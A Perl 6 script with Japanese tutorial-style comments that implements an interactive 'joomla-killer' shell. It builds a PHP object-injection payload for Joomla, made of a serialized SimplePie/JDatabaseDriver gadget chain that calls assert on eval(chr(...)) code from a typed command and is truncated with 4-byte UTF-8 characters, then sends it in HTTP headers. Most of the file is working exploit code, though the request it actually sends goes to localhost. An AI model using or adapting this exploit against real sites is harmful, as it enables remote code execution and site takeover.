#!/usr/local/bin/perl6
use v6;
use lib '.';
use MyPerl6Module;
use HttpHeader;
use MyMap;

# 全てを読み込む場合は :ALL: をつける
#use MyPerl6Module :ALL:;

# sub MAINは最初に呼び出される
# コマンドパラメータを --name=value の形式で受けるときは先頭に：をつける。
# ！は必須パラメータ
sub MAIN(Str $url!, Bool :$print = False) {
  my Int $port = 80;
  my $utf8char = <131083 135741 135963 136302 137405 134047 136884 138804 143812 144836 145215 145251 146686 149489 152718 152846 153457 154052 155041 158463 159296 159988 161412 164471 164813 172432 131209 131234 131236 131490 131603 131883 131969 131953 132089 132170 132361 132566 132648 132943 133127 133178 133305 133500 133533 133843 133917 134469 134625 134805>.chrs.encode;
  my $injection_str = '_hackedByPerl6|O:6:"Class1":1:{s:15:"%00Class1%00private";s:3:"prv";}';
  # 引数がリストで読める
  #say @*ARGS.perl;

  "".say;
  ("URL: " ~ $url).say;
  ("--print: " ~ $print).say;

  # ターゲット情報のインスタンスを作成
  my $targetModel;
  my $exception;
  {
    $targetModel = UrlModel.new(url=>$url);
    "=========== target: $targetModel.getReal() ============".say;
    CATCH {
      default {
        $exception = $_;
      }
    }
  }
  if $exception {
    $exception.say;
    exit(1);
  }

  # 無限ループ
  loop (;;){
    # 投入コマンド取得
    my $cmd_str = getCmd();
    # windowsだからencodeが要るのかな。。。？
    if $cmd_str.encode eq "quit" || $cmd_str.encode eq "q" {
      "Exit.".say;
      exit(0);
    }
    info("input string: " ~ $cmd_str);
    
    # インジェクションする文字列を生成
    my Str $exploit = getExploit($cmd_str);

    for 1..3 {
      # ヘッダーオブジェクトを作成
      # どっちでもいける
      #my Header $header = Header.new(x-forwarded-for=>$exploit);
      my Header $header = Header.new(:x-forwarded-for($exploit));
      # Cookieを設定
      
      # Hostを設定
      $header.setHost($targetModel.getHost);
      my MyMap @headers = $header.get();
      for @headers {
        .key.say;
        .val.say;
      }
      
      # デバッグ用データ
      my Str @test;
      @test.push("GET /phptest/phptest.php HTTP/1.1\n");
      @test.push("Host: localhost\n");
      @test.push("User-Agent: " ~ $injection_str ~ $utf8char.decode ~ "\n");
      @test.push("Connection: close\n");
      @test.push("\n");
      
      # 接続とリクエスト送信
      my $conn = IO::Socket::INET.new(:host<localhost>, :port(80), :familly(2), :encoding('utf-8'), :nl-in("\r\n"));
      for @test -> $request {
        $conn.print: $request;
      }
      #say $conn.recv;
      
      # ヘッダの取得
      my Str $status;
      my Str $receive;
      for $conn.lines() -> $line {
        # \n は入ってこないので CR の\rのみを判定。 多分、readなら入ってくる。
        if $line ~~ /^\r$/ { last; }
        # ステータスコードを格納する （）で囲まれた箇所はMatch型なのでsayすると「」で包まれる
        if $line ~~ /^HTTP\/1.1<space>(<[0..9]>+)<space>(<[a..zA..Z0..9<space>\']>+)/ {
          # Match型で返ってくるので、Strにキャストする
          $status = $/.[0].Str;
          #$/.say;
        }
        # 置換してCookieを格納する
        if $line ~~ /^Set< - >Cookie: / { $header.setCookie($line.chomp.subst(/^Set< - >Cookie": "/, "", :x(1)).split(";").[0]); }
        #$line.Str.say;
        $receive ~= $line.Str;
      }
      
      # ボディー部分の取得
      for $conn.lines() -> $line {
        $receive ~= $line.Str;
      }
      
      result($status);
      #$header.getCookie.say;
      #$receive.say;
    }
    
  }
  
  exit;
  
  
}
#===========#
#    SUB    #
#===========#
sub getExploit($cmd_str) {
  my $utf8char = <131083 135741 135963 136302 137405 134047 136884 138804 143812 144836 145215 145251 146686 149489 152718 152846 153457 154052 155041 158463 159296 159988 161412 164471 164813 172432 131209 131234 131236 131490 131603 131883 131969 131953 132089 132170 132361 132566 132648 132943 133127 133178 133305 133500 133533 133843 133917 134469 134625 134805>.chrs.encode;
  my @CmdChars = $cmd_str.split("",:skip-empty);
  # 前後の空白を削る
  @CmdChars = cutEdge(@CmdChars);
  
  # 複数行コメントは#`の後に好きなカッコをつける。
  # カッコは重ねられるし、全角でもよい。
  #`({
  # 配列のサイズ
  info("ary size: " ~ @CmdChars.end);
  # 単純なことはmapで出来る
  #@CmdChars.map: *.say;
  # 順番に処理されないけど同じことができる
  #@CmdChars>>.say;
  # 基本的な形
  {
    my $i = 0;
    for @CmdChars {
      print $i;
      .say;
      $i++;
    }
  }
  })
  
  my @chars;
  for @CmdChars -> $c {
    # 10進数のコードポイントに変換する
      @chars.push(sprintf "chr(%s)", $c.ord);
    # 追加した文字列を表示
    #@chars.[@chars.end].say;
  }
  # eval()で囲んでドット(.)でつなぐ
  my $php_payload = sprintf "eval(%s)", @chars.join('.');
  #$php_payload.say;
  
  my Str $exploit;
  my Str $injected_payload;
  $exploit = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";';
  $injected_payload = sprintf "%s;JFactory::getConfig();exit", $php_payload;
  $exploit ~= sprintf 's:%s:"%s"', $injected_payload.chars, $injected_payload;
  $exploit ~= ';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}';
  $exploit ~= $utf8char.decode;
  $exploit.say;
  
  return $exploit;
}

sub getCmd() {
  loop (;;) {
    "<joomla-killer-Perl6!>\$ ".print;
    # 改行は含まれない模様
    my Str $cmd =  $*IN.get().chomp;
    #my Str $cmd = $*IN.get();
    # 空なら再度ループ
    if $cmd.chars > 0 {
      return $cmd;
    }
  }
}

sub cutEdge(@ary) {
  @ary.shift;
  @ary.pop;
  return @ary;
}

sub err($mess) {
  print "[error] " ~ $mess ~ "\n";
}

sub info($mess) {
  print "[info] " ~ $mess ~ "\n";
}

sub result($mess) {
  print "[Result] " ~ $mess ~ "\n";
}

